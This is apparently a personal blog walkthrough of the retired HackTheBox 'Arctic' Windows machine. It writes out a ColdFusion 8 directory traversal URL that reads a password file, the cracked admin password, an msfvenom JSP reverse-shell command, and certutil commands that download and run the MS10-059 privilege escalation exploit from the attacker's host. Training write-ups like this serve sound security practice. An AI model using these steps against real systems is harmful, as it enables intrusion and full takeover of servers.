---
title: Arctic - HackTheBox Walkthrough
author: Degr4ne
date: 2021-10-22 12:00:00 
categories: [HackTheBox,Windows]
tags: [directory traversal,windows-exploit-suggester,certutil]
math: false
mermaid: false
image:
  src: /assets/img/HTB/Arctic/00-banner.png
  width: 587
  height: 353
---
Hello guys, welcome back with another walkthrough, this time we'll be doing `Arctic` a retired windows machine from HackTheBox rated easy. Without further ado, let’s begin.
# Recon
## Nmap Scan
As always we’ll start with a nmap scan to discover the open ports and services.

```console
$ cat nmap-scan
# Nmap 7.91 scan initiated Thu Oct 21 13:54:37 2021 as: nmap -sC -sV -v -oN nmap-scan -Pn 10.129.240.247
Nmap scan report for 10.129.240.247
Host is up (0.13s latency).
Not shown: 997 filtered ports
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Oct 21 13:57:31 2021 -- 1 IP address (1 host up) scanned in 174.64 seconds
```
3 ports are open `135,49154:MRPC` and `8500` possibly running FMTP.
## HTTP Enumeration
Enumerating the port 8500 it turn out to be http, it shows a directory listing.

![01-web](/assets/img/HTB/Arctic/01-web.png)

After open some pages I came across with `/CFIDE/administrator`.

![02-web](/assets/img/HTB/Arctic/02-web.png)

Which displays a login page for `Adobe ColdFusion 8`

![03-login](/assets/img/HTB/Arctic/03-login.png)

# Initial Foothold
First thing I did was check if it had any vulnerability and I found this [exploit](https://www.exploit-db.com/exploits/14641) which is a Directory Traversal.
This exploit shows the content of `password.properties` file.

![04-exploit](/assets/img/HTB/Arctic/04-exploit.png)

We can do it manually just using the next URL.
```text
http://10.129.240.247:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
```
Looking at the source code, it give us the password hashed for the user `admin`

![05-hash](/assets/img/HTB/Arctic/05-hash.png)

But [crackstation](https://crackstation.net/) can crack it.

![06-passwd](/assets/img/HTB/Arctic/06-passwd.png)

User|Password
-|-
admin|happyday

Once we are in, just need upload a reverse shell scheduling a new task in the system.
Before that create a payload using `msfvenom`.
```console
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.75 LPORT=443 -o shell.jsp
```
The category of "Debugging & Logging > Schedule Task" will allow us to upload files, and "Server Settings > Mapping" gonna display the directory path of `/CFIDE` this will be useful at the time of create the task.

![07-task](/assets/img/HTB/Arctic/07-task.png)

The directory path to CFIDE is `C:\ColdFusion8\wwwroot\CFIDE`,  after knowing this we can go to "Debugging & Logging > Schedule Task".

![08-path](/assets/img/HTB/Arctic/08-path.png)

Create a Python HTTP Server in the same directory that is our payload and complete the name,url of our python server, the admin's credentials and the path to save our shell.jsp file like the screenshot below.

![09-upload](/assets/img/HTB/Arctic/09-upload.png)

Submit it and click in run, after that, I went to this URL: `http:\\10.129.240.247:8500\CFIDE`

![10-task](/assets/img/HTB/Arctic/10-task.png)

Here we see our payload.

![11-shell](/assets/img/HTB/Arctic/11-shell.png)

At the time of click `shell.jsp` we will recive the reverse shell on the netcat listener port.

![12-shell](/assets/img/HTB/Arctic/12-shell.png)
# Privilage Escalation
Running `systeminfo` shows some information of the system. I copied the output and saved it in a file `sysinfo.txt` to use it with [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py), this tool needs the python xlrd library.
```console
$ python -m pip install xlrd
$ pip install xlrd=1.2.0
```
Create a database and run it using the file created.
```console
$ python windows-exploit-suggester.py --update
$ python windows-exploit-suggester.py --database 2021-10-21-mssb.xls --systeminfo sysinfo.txt
```

![13-suggester](/assets/img/HTB/Arctic/13-suggester.png)

Searching about `MS10-059` I found a executable in this [repository](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe)

I downloaded the binary, opened a python http server and on the victim machine ran this commands to transfer the `.exe` file:

```text
certutil.exe -urlcache -f http://10.10.14.75/MS10-059.exe
C:\Windows\Temp\MS10-059.exe 10.10.14.75 443
```

![14-certutil](/assets/img/HTB/Arctic/14-certutil.png)

It give us a shell as Administrator.

![15-root](/assets/img/HTB/Arctic/15-root.png)

That’s it for now guys. Until next time.
